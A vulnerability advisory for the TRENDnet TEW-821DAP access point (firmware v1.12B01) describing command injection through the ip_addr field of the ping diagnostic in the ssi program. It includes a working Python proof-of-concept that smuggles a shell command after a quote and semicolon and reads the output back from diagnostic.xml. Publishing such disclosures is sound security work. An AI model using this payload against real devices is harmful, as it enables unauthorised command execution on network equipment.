# Command injection Vulnerability in Firmware Update Process of Trendnet TEW-821DAP


## Affected Product
TEW-821DAP (firmware version:v1.12B01)

## Overview

During the firmware update process, there is command injection vulnerability in function tools_diagnostic() of program ssi. The users first input the IP address in the web page which would performs regular expression validation and transfer the IP address to ssi through AJAX POST request. Then, in the tools_diagnostic() of program ssi, the IP address is stored in variable s and is used as a parameter of the ping command. However, the hackers could inject malicious command into IP address. The POC is as the following:

```
def vuln01_ping_cmdi(self, cmd):
        print(f"[*] Vul #1: Ping command injection")
        print(f"[*] malicious: {cmd}")
        # actual command: nohup script -c "ping 127.0.0.1" -f /dev/null;{cmd};# -s 56 -c 1" -f /tmp/xxx
        payload = f'127.0.0.1" -f /dev/null;{cmd};#'
        params = {
            "method": "0",
            "ip_addr": payload,
            "pkt_size": "56",
            "cnt": "1",
        }
        resp = self._post_apply("tools_diagnostic", params)
        print(f"[*] HTTP response code: {resp.status_code}")
        time.sleep(3)
        try:
            result_resp = self.session.get(f"{self.base_url}/diagnostic.xml")
            if result_resp.status_code == 200:
                print(f"[*] result:")
                print(result_resp.text)
        except Exception:
            pass
        return resp

```

Through the above POC, the hackers could perform malicious command injection to execute arbitrary code or cause denial of service.
 
<img width="416" height="96" alt="image" src="https://github.com/user-attachments/assets/9fa2beb1-0984-45ca-80c9-0cdeabdf23d1" />



